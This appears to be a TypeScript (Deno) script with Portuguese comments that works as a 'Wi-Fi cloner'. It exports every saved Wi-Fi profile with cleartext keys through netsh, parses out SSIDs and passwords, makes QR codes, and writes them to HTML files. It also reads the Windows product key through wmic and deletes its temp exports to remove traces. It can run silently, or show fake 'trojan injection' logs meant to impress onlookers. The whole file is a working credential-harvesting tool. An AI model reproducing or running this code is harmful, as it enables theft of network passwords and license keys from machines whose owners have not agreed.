import { checkDirs, clearTags, getHTML, now, showLogs, sleep } from './Util.ts';
import { SpinnerTypes, TerminalSpinner } from 'spinners';
import { qrcode } from 'qrcode';
import colors from 'colors';
import $ from 'dax';

let key = ''; // Windows License Key
let c = 0; // network counter
colors;

// Verifica se todas as pastas necessárias foram criadas
await checkDirs();

// 'Title.txt' contém uma string bem cringe
const title: string = await Deno.readTextFile('data/Title.txt').catch(() => '');

showLogs() && console.log(title.red);

class Spinner {
	title: string;
	msg: string;
	spinner?: TerminalSpinner;

	constructor(title: string, msg: string) {
		this.title = title;
		this.msg = msg;

		// Inicia Spinner
		showLogs() &&
			(this.spinner = new TerminalSpinner({
				text: this._format(),
				spinner: {
					interval: 40,
					frames: SpinnerTypes.dots.frames,
				},
				indent: 1,
				color: 'green',
			}).start());
	}

	end(msg: string) {
		this.msg = msg;
		this.spinner?.succeed(this._format(1));
	}

	fail(msg: string) {
		this.msg = msg;
		this.spinner?.fail(this._format(0));
	}

	_format(status = 0) {
		return [ // Modelo de string
			'[',
			this.title.toUpperCase().green, // [ SECTOR
			'|',
			now('T').yellow, // [ SECTOR | 18:04
			'] -',
			status ? this.msg.red : this.msg.cyan,
		].join(' ').text_bold; // [ SETOR | 18:04 ] - TEXT
	}
}

// "injetar trojan" vulgo acessar uma API nativa do Windows
await NetSHProfileCollector();

// Copiar key do Windows
await copyWinKey();

// Limpar registros de arquivos
await Deno.remove('temp', { recursive: true }).catch(() => {});
// 'recursive' significa que é pra apagar mesmo se tiver arquivos dentro

!showLogs() && Deno.exit();

async function NetSHProfileCollector() {
	// sem await pra exibir os logs enquanto copia os dados
	createFakeLogs();

	// Chama a API do Windows
	await $`netsh wlan export profile key=clear folder=temp`.lines();

	for await (const file of Deno.readDir('temp')) {
		// Por padrão, A API fornece as informações em arquivos XML bem poluídos
		// Então eu fiz essa bosta aqui pra deixar só o que é realmente importante
		c++;

		// Lendo o conteúdo do arquivo
		const content = await Deno.readTextFile(`temp/${file.name}`);

		// Filtrando as tags que são úteis
		const [SSID, , auth, pswd] = clearTags(content.matchAll(
			/<(name|authentication|keyMaterial)>.*?<\/.*>/g,
		));

		// Gerando QR Code para conectar
		const networkQR = await qrcode(
			`WIFI:S:${SSID};T:${auth};P:${pswd};H:false;;`,
			{ size: 256 },
		);

		// Escrevendo arquivos com as informações filtradas no diretório final
		const body = `
		SSID: <s${SSID[0]}s>
		Data: <s${now()}s> (<timestamp>${now(true)}</timestamp>)
		Autenticação: ${auth[1]}
		Senha: <s${pswd[1]}s><br>
	<img src="${networkQR}">`;

		await Deno.writeTextFile(
			`data/WiFiPasswords/${SSID[0]}.html`,
			getHTML(SSID[0], body),
		);
	}
}

async function copyWinKey() {
	key = (await $`wmic path softwarelicensingservice get OA3xOriginalProductKey`
		.lines())[1].trim();

	const body = `
	Máquina: <s${Deno.hostname()}s>
	Data: <s${now()}s> (<timestamp>${now(true)}</timestamp>)
	Chave de ativação do Windows: <s<key>${key}</key>s>`;

	await Deno.writeTextFile(
		`data/WindowsKeys/${Deno.hostname()}.html`,
		getHTML(Deno.hostname(), body),
	);
}

async function createFakeLogs() {
	let spinner;
	const fakeLogs = [
		['Injetando Trojan na API do NetSH...', 'Script injetado.'],
		['Modificando permissões do Windows...', 'Permissões concedidas.'],
		[
			'Abrindo porta no FireWall...',
			'FireWall desbloqueado na porta 8080.',
		],
	];

	// Exibe status fakes pra impressionar leigos
	for (const msg of fakeLogs) {
		spinner = new Spinner('Wi-Fi CLONER', msg[0]);
		await sleep();
		spinner.end(msg[1]);
	}

	spinner = new Spinner('Wi-Fi CLONER', 'Clonando redes Wi-Fi...');
	await sleep(1_500, 3_000);
	spinner.end(`${c} redes clonadas.`.text_underscore.bg_red.white);

	spinner = new Spinner('KEY CLONER', 'Obtendo chave de ativação...');
	await sleep();
	spinner.end(`Chave de ativação: ${key.text_underscore.bg_red.white}`);

	spinner = new Spinner('CLEANER', 'Apagando registros...');
	await sleep();
	spinner.end('Registros excluídos.');
	await sleep(1_500, 3_000);

	showLogs() && Deno.exit();
}
